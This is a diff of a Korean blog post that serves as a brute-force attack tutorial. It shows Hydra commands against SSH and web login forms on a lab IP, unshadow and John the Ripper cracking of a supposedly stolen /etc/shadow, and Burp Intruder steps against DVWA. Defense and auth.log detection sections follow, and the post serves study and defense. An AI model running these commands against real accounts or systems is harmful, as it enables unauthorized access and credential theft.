@@ -1,123 +1,89 @@
----
+﻿---
 layout: post
-title: "Brute Force 공격 실습"
+title: "Brute Force Attack"
 date: 2025-11-03 17:00:00 +0900
 categories: [hacking-tools]
 ---
 
-## 1. 개념
+## 1. 개요
 
-**Brute Force (무차별 대입 공격)**는 가능한 모든 비밀번호 조합을 시도하여 인증을 돌파하는 공격 기법입니다.
-
-### 관련 도구
-
-| 도구 | 용도 |
-|------|------|
-| Hydra | 네트워크 서비스 (SSH, FTP, HTTP 등) |
-| John the Ripper | 오프라인 해시 크래킹 |
-| Hashcat | GPU 기반 해시 크래킹 |
-| Burp Suite Intruder | 웹 폼 공격 |
-
-### 공격 유형
-
-| 유형 | 설명 |
-|------|------|
-| Dictionary Attack | 사전 파일 사용 (rockyou.txt 등) |
-| Pure Brute Force | 모든 문자 조합 시도 |
-| Hybrid | 사전 + 규칙 적용 (password → Password1!) |
-| Credential Stuffing | 유출된 ID/PW 조합 재사용 |
+**Brute Force (무차별 대입 공격)**는 공격자가 가능한 모든 경우의 수(비밀번호 조합)를 입력하여 인증 시스템을 무력화하는 가장 원시적이지만 강력한 해킹 기법이다.
+단순한 무차별 대입뿐만 아니라 유출된 비밀번호 목록을 사용하는 `Dictionary Attack`이나 `Credential Stuffing`도 널리 사용된다.
+본 글에서는 Hydra와 John the Ripper 등 다양한 도구를 사용하여 SSH 및 웹 로그인 폼을 대상으로 한 공격을 실습하고, 이를 방어하기 위한 계정 잠금 정책 등을 알아본다.
 
 ---
 
-## 2. 사용법
+## 2. 공격 도구 및 유형
+
+| 도구 | 용도 |
+|------|------|
+| **Hydra** | 온라인 네트워크 서비스 (SSH, FTP, HTTP 등) 공격 |
+| **John the Ripper** | 오프라인 해시 크래킹 |
+| **Burp Suite Intruder** | 웹 애플리케이션 로그인 폼 공격 |
+| **Hashcat** | GPU 가속을 이용한 고속 해시 크래킹 |
+
+| 유형 | 설명 |
+|------|------|
+| **Dictionary Attack** | 자주 사용되는 단어가 수록된 사전 파일(`rockyou.txt` 등)을 대입 |
+| **Pure Brute Force** | 문자, 숫자, 특수문자의 모든 조합을 시도 (시간 소요 큼) |
+| **Credential Stuffing** | 타 사이트에서 유출된 ID/PW 쌍을 다른 서비스에 대입 |
+
+---
+
+## 3. 공격 실습: SSH 및 웹
 
 ### Hydra - SSH 공격
+원격지 SSH 서비스(22번 포트)에 대해 사전 파일을 대입한다.
 ```bash
-hydra -l root -P /usr/share/wordlists/rockyou.txt 10.0.0.11 ssh
+hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 10.0.0.11 ssh
 ```
+*   `-l`: 사용자명 지정
+*   `-P`: 비밀번호 사전 파일 지정
+*   `-t`: 동시 연결 스레드 수 (기본 16, 너무 높으면 차단 위험)
 
-| 옵션 | 설명 |
-|------|------|
-| `-l` | 단일 사용자명 |
-| `-L` | 사용자명 사전 파일 |
-| `-p` | 단일 비밀번호 |
-| `-P` | 비밀번호 사전 파일 |
-| `-t` | 동시 연결 수 |
-
-### Hydra - 웹 폼 공격
+### John the Ripper - Linux 해시 크래킹
+리눅스의 `/etc/shadow` 파일을 탈취했다고 가정하고, 이를 크래킹한다.
 ```bash
-hydra -l admin -P passwords.txt 10.0.0.11 http-post-form \
-"/login.php:username=^USER^&password=^PASS^:Login failed"
-```
-
-### John the Ripper - 해시 크래킹
-```bash
-# Shadow 파일 크래킹
+# Shadow 파일과 Passwd 파일 결합
 unshadow /etc/passwd /etc/shadow > hashes.txt
+
+# 크래킹 실행
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# 결과 확인
 john --show hashes.txt
 ```
 
 ---
 
-## 3. 실습 예시
+## 4. 공격 실습: 웹 폼
 
-### DVWA Brute Force
-1. Burp Suite로 로그인 요청 캡처
-2. Intruder로 전송 (Ctrl+I)
-3. 비밀번호 파라미터에 `§` 표시
-4. Payloads 탭에서 사전 파일 로드
-5. Attack 시작
-6. 응답 길이가 다른 항목 = 성공한 비밀번호
+DVWA와 같은 웹 애플리케이션의 로그인 페이지를 대상으로 Burp Suite를 사용한다.
 
-### SSH Brute Force (Hydra)
-```bash
-# 실습 환경
-hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 10.0.0.11 ssh
-
-# 결과
-[22][ssh] host: 10.0.0.11   login: user   password: password123
-```
+1.  **패킷 캡처**: Burp Suite Proxy로 로그인 요청을 가로챈다.
+2.  **Intruder 전송**: `Ctrl+I`를 눌러 Intruder 도구로 보낸다.
+3.  **Position 설정**: 비밀번호 파라미터 값에만 페이로드 위치(`§`)를 지정한다.
+4.  **Payload 설정**: `rockyou.txt` 등의 사전 파일을 로드한다.
+5.  **결과 분석**: 공격 실행 후 응답 길이(Length)나 상태 코드가 다른 항목을 찾으면 그것이 올바른 비밀번호이다.
 
 ---
 
-## 4. 방어 대책
+## 5. 보안 대책 및 탐지
 
-| 대책 | 설명 |
-|------|------|
-| 계정 잠금 | N회 실패 시 계정 잠금 |
-| Rate Limiting | 로그인 시도 횟수 제한 |
-| CAPTCHA | 자동화 공격 방지 |
-| 2FA/MFA | 다중 인증 요구 |
-| 강력한 비밀번호 정책 | 복잡도, 길이 요구 |
-| Fail2ban | IP 기반 차단 |
+### 보안 대책
+*   **계정 잠금 (Account Lockout)**: 5회 이상 실패 시 30분간 계정 잠금 설정.
+*   **복잡도 정책**: 대소문자, 숫자, 특수문자 포함 및 8자리 이상 강제.
+*   **Fail2Ban**: 특정 시간 내 다수 실패 시 방화벽(IPtables) 레벨에서 해당 IP 차단.
+*   **MFA (다중 인증)**: 비밀번호 외에 OTP 등 추가 인증 수단 도입.
 
-### Fail2ban 설정 예시
+### 탐지 방법
+리눅스 서버의 `auth.log`를 분석하여 공격 시도를 탐지할 수 있다.
 ```bash
-# /etc/fail2ban/jail.local
-[sshd]
-enabled = true
-maxretry = 3
-bantime = 3600
-findtime = 600
-```
-
----
-
-## 5. 탐지 방법
-
-### 로그 분석
-```bash
-# SSH 실패 로그
+# 로그인 실패 로그 검색
 grep "Failed password" /var/log/auth.log
 
-# 다수 실패 IP 확인
+# 공격자 IP별 시도 횟수 통계
 grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
 ```
-
-### 모니터링 지표
-- 짧은 시간 내 다수 로그인 실패
-- 동일 IP에서 여러 계정 시도
-- 비정상적인 시간대 로그인 시도
 
 <hr class="short-rule">
